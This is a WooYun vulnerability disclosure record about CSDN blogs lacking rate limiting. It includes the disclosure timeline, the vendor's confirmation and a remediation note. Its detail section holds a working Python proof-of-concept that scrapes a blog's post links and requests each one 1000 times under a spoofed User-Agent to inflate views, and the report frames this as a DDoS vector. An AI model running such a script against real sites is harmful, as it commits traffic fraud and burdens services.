{"id": 76592, "wybug_id": "wooyun-2015-0164529", "wybug_title": "CSDN博客未对访问做任何控制导致批量刷访问量+DDOS（附poc）", "wybug_corp": "CSDN开发者社区", "wybug_author": "NeverEnd", "wybug_date": "2015-12-25 16:17", "wybug_open_date": "2016-02-08 18:23", "wybug_type": "网络设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-08：\t细节向公众公开  简要描述： CSDN博客未对访问做任何控制导致批量刷访问量+DDOS攻击 详细说明：  csdn未对用户的访问做任何控制，包括频率、用户ip等等，所以写个脚本一直访问页面就可以达到增加博客访问量的效果。代码如下：\n# -*- coding:utf-8 -*-import sysimport urllibimport urllib2import rereload(sys)sys.setdefaultencoding('utf-8')# 伪装成浏览器headers = {    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36'}# 指定url并发送请求req = urllib2.Request(    # ******为你的博客名    'http://blog.csdn.net/******?viewmode=list', headers=headers)# 服务端响应来自客户端的请求response = urllib2.urlopen(req)lines = ''.join(response.read())# 正则表达式得到链接regex = r'href=\"(.*?)\"'L = []#count用来记数，因为根据此正则规则从源码找出的有重复count = 1 for m in re.findall(regex, lines):    if len(m) == 35 and count % 2 == 1 and \"category\" not in m and m not in L:    \tL.append(m)    count = count + 1#开始拼接每一个url并循环访问urlprint \"get url:\"+'\\n'print len(L)a = 0for mm in L:\turl = 'http://blog.csdn.net/' + mm\tprint url\theaders = {    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36'}\t#每个url循环1000次,可以设置更多\tfor num in range(1,1001):\t\treq_url = urllib2.Request(url, headers=headers)\t\tresponse_url = urllib2.urlopen(req_url)\tprint \"crawling success\"print \"ok\"\n   漏洞证明：  原来的博客：\n\n一夜之后：\n\n博客也从不到1000变成了1W+......\n\n   修复方案：  访问做限制。   版权声明：转载请注明来源 NeverEnd@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-12-25 18:46 厂商回复： 尽快修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}